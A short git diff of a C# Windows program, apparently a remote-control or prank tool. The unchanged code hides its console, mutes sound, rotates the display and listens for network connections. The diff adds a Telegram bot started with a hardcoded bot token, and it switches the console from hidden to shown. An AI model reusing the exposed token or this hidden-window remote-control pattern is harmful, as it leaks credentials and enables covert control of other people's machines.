@@ -29,19 +29,22 @@ namespace WinSrv
         const int SW_HIDE = 0;
         const int SW_SHOW = 5;
 
+        
 
         static void Main(string[] args)
         {
+            Telegram bot = new Telegram("1812366377:AAH3P0aiiRl_eVmO_r5KOd6eORrskC05oM0");
+            bot.helloWorld();
 
             var handle = GetConsoleWindow();
 
 
             // Hide
-            ShowWindow(handle, SW_HIDE);
+            //ShowWindow(handle, SW_HIDE);
 
 
             // Show
-            //ShowWindow(handle, SW_SHOW);
+            ShowWindow(handle, SW_SHOW);
 
             Funkcje.muteSound();
 
@@ -59,6 +62,8 @@ namespace WinSrv
             Task listen = Server.HandleIncomingConnections();
 
             Console.ReadLine();
+
+            bot.telegramStop();
 
             Display.Rotate(1, Display.Orientations.DEGREES_CW_0);
         }
